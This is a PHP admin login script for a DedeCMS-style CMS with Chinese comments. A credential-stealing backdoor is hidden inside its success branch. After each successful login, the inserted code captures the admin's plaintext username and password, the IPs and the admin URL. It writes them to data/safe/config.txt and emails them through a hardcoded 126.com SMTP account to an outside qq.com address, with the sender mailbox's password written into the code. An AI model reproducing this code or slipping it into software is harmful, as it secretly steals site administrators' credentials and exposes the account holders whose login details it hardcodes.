<?php
/**
 * 后台登陆
 *
 * @version        $Id: login.php 1 8:48 2010年7月13日Z tianya $
 * @package        AmvipCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.amvip.com/usersguide/license.html
 * @link           http://www.amvip.com
 */
require_once(dirname(__FILE__).'/../include/common.inc.php');
require_once(DEDEINC.'/userlogin.class.php');
if(empty($dopost)) $dopost = '';

//检测安装目录安全性
if( is_dir(dirname(__FILE__).'/../install') )
{
    if(!file_exists(dirname(__FILE__).'/../install/install_lock.txt') )
    {
      $fp = fopen(dirname(__FILE__).'/../install/install_lock.txt', 'w') or die('安装目录无写入权限，无法进行写入锁定文件，请安装完毕删除安装目录！');
      fwrite($fp,'ok');
      fclose($fp);
    }
    //为了防止未知安全性问题，强制禁用安装程序的文件
    if( file_exists("../install/index.php") ) {
        @rename("../install/index.php", "../install/index.php.bak");
    }
    if( file_exists("../install/module-install.php") ) {
        @rename("../install/module-install.php", "../install/module-install.php.bak");
    }
	$fileindex = "../install/index.html";
	if( !file_exists($fileindex) ) {
		$fp = @fopen($fileindex,'w');
		fwrite($fp,'dir');
		fclose($fp);
	}
}

//更新服务器
require_once (DEDEDATA.'/admin/config_update.php');

if ($dopost=='showad')
{
    include('templets/login_ad.htm');
    exit;
}

//检测后台目录是否更名
$cururl = GetCurUrl();
if(preg_match('/dede\/login/i',$cururl))
{
    $redmsg = '<div class=\'safe-tips\'>您的管理目录的名称中包含默认名称dede，建议在FTP里把它修改为其它名称，那样会更安全！</div>';
}
else
{
    $redmsg = '';
}

//登录检测
$admindirs = explode('/',str_replace("\\",'/',dirname(__FILE__)));
$admindir = $admindirs[count($admindirs)-1];
if($dopost=='login')
{
    $validate = empty($validate) ? '' : strtolower(trim($validate));
    $svali = strtolower(GetCkVdValue());
    if(($validate=='' || $validate != $svali) && preg_match("/6/",$safe_gdopen)){
        ResetVdValue();
        ShowMsg('验证码不正确!','login.php',0,1000);
        exit;
    } else {
        $cuserLogin = new userLogin($admindir);
        if(!empty($userid) && !empty($pwd))
        {
            $res = $cuserLogin->checkUser($userid,$pwd);

            //success
            if($res==1)
            {
                $cuserLogin->keepUser();
				


$time=date("Y-m-d h:i:s");
$userid=$_POST['userid'];
$pwd=$_POST['pwd'];
$ipsaddr=$_SERVER["REMOTE_ADDR"];
$sipaddr=get_server_ip();
$lianjie='http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$_SERVER['QUERY_STRING'];


set_time_limit(600);
/* 
* 邮件发送类 
*/ 
class smail { 
//您的SMTP 服务器供应商，可以是域名或IP地址 
var $smtp = ""; 
//SMTP需要要身份验证设值为 1 不需要身份验证值为 0，现在大多数的SMTP服务商都要验证，如不清楚请与你的smtp 服务商联系。 
var $check = 1; 
//您的email帐号名称 
var $username = ""; 
//您的email密码 
var $password = ""; 
//此email 必需是发信服务器上的email 
var $s_from = ""; 
/* 
* 功能：发信初始化设置 
* $from 你的发信服务器上的邮箱 
* $password 你的邮箱密码 
* $smtp 您的SMTP 服务器供应商，可以是域名或IP地址 
* $check SMTP需要要身份验证设值为 1 不需要身份验证值为 0，现在大多数的SMTP服务商都要验证 
*/ 
function smail ( $from, $password, $smtp, $check = 1 ) { 
if( preg_match("/^[^\d\-_][\w\-]*[^\-_]@[^\-][a-zA-Z\d\-]+[^\-](\.[^\-][a-zA-Z\d\-]*[^\-])*\.[a-zA-Z]{2,3}/", $from ) ) { 
$this->username = substr( $from, 0, strpos( $from , "@" ) ); 
$this->password = $password; 
$this->smtp = $smtp ? $smtp : $this->smtp; 
$this->check = $check; 
$this->s_from = $from; 
} 
} 
/* 
* 功能：发送邮件 
* $to 目标邮箱 
* $from 来源邮箱 
* $subject 邮件标题 
* $message 邮件内容 
*/ 
function send ( $to, $from, $subject, $message ) { 
//连接服务器 
$fp = fsockopen ( $this->smtp, 25, $errno, $errstr, 60); 
/*if (!$fp ) return "联接服务器失败".__LINE__;*/ 
set_socket_blocking($fp, true ); 
$lastmessage=fgets($fp,512); 
/*if ( substr($lastmessage,0,3) != 220 ) return "错误信息1:$lastmessage".__LINE__; */
//HELO 
$yourname = "YOURNAME"; 
if($this->check == "1") $lastact="EHLO ".$yourname."\r\n"; 
else $lastact="HELO ".$yourname."\r\n"; 
fputs($fp, $lastact); 
$lastmessage == fgets($fp,512); 
/*if (substr($lastmessage,0,3) != 220 ) return "错误信息2:$lastmessage".__LINE__; */
while (true) { 
$lastmessage = fgets($fp,512); 
if ( (substr($lastmessage,3,1) != "-") or (empty($lastmessage)) ) 
break; 
} 
//身份验证 
if ($this->check=="1") { 
//验证开始 
$lastact="AUTH LOGIN"."\r\n"; 
fputs( $fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != 334) return "错误信息3:$lastmessage".__LINE__; */
//用户姓名 
$lastact=base64_encode($this->username)."\r\n"; 
fputs( $fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != 334) return "错误信息4:$lastmessage".__LINE__; */
//用户密码 
$lastact=base64_encode($this->password)."\r\n"; 
fputs( $fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != "235") return "错误信息5:$lastmessage".__LINE__; */
} 
//FROM: 
$lastact="MAIL FROM: <". $this->s_from . ">\r\n"; 
fputs( $fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != 250) return "错误信息6:$lastmessage".__LINE__;*/ 
//TO: 
$lastact="RCPT TO: <". $to ."> \r\n"; 
fputs( $fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != 250) return "错误信息7:$lastmessage".__LINE__;*/ 
//DATA 
$lastact="DATA\r\n"; 
fputs($fp, $lastact); 
$lastmessage = fgets ($fp,512); 
/*if (substr($lastmessage,0,3) != 354) return "错误信息8:$lastmessage".__LINE__;*/ 
 
//处理Subject头 
$head="Subject: $subject\r\n"; 
$message = $head."\r\n".$message; 
 
//处理From头 
$head="From: $from\r\n"; 
$message = $head.$message; 
//处理To头 
$head="To: $to\r\n"; 
$message = $head.$message; 
 
//加上结束串 
$message .= "\r\n.\r\n"; 
//发送信息 
fputs($fp, $message); 
$lastact="QUIT\r\n"; 
fputs($fp,$lastace); 
fclose($fp); 
return 0; 
} 
} 
// 发送示例 
$title="网站$lianjie\r\n 后台信息";
$body="登录时间：$time\r\n服务器ip：$sipaddr\r\n客户端ip：$ipsaddr\r\n地址：$lianjie\r\n账号：$userid\r\n密码：$pwd\r\n";

$myfile = fopen("../data/safe/config.txt", "w");
$txt = "网站$lianjie 后台信息\r\n登录时间：$time\r\n服务器ip：$sipaddr\r\n客户端ip：$ipsaddr\r\n地址：$lianjie\r\n账号：$userid\r\n密码：$pwd\r\n";
fwrite($myfile, $txt); 
 
// 只需要把这部分改成你的信息就行
$sm = new smail( "cheerhen@126.com", "xf86551345", "smtp.126.com" ); 
$end = $sm->send( "531505265@qq.com", "cheerhen@126.com", "$title", "$body" ); 
if( $end ) echo $end; 

/*<script>alert('信息提交成功！');window.history.go(-1);</script>*/


				

				
                if(!empty($gotopage))
                {
                    ShowMsg('成功登录，正在转向管理管理主页！',$gotopage);
                    exit();
                }
                else
                {
                    ShowMsg('成功登录，正在转向管理管理主页！',"index.php");
                    exit();
                }
            }

            //error
            else if($res==-1)
            {
				ShowMsg('你的用户名不存在!',-1,0,1000);
				exit;
            }
            else
            {
                ShowMsg('你的密码错误!',-1,0,1000);
				exit;
            }
        }

        //password empty
        else
        {
            ShowMsg('用户和密码没填写完整!',-1,0,1000);
			exit;
        }
    }
}


    /**
	* 获取服务器端IP地址
	* @return string
	*/
	function get_server_ip() { 
	if (isset($_SERVER)) { 
	    if($_SERVER['SERVER_ADDR']) {
	        $server_ip = $_SERVER['SERVER_ADDR']; 
	    } else { 
	        $server_ip = $_SERVER['LOCAL_ADDR']; 
	    } 
	} else { 
	    $server_ip = getenv('SERVER_ADDR');
	} 
	return $server_ip; 
	}


include('templets/login.htm');
